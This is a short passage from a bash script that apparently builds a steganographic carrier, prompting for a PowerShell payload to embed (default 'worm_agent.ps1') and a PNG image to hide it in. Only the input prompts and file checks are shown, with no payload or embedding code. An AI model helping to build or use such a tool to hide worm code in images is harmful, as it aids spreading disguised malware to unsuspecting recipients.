    ask "Payload to embed [default: worm_agent.ps1]:"
    read -r _IN
    [ -n "$_IN" ] && PS1_IN="${_IN// /}"
    [ -f "$PS1_IN" ] || { err "File not found: $PS1_IN"; return 1; }

    ask "Carrier PNG (leave blank for auto-generated gradient):"
    read -r _CARRIER
    _CARRIER="${_CARRIER// /}"

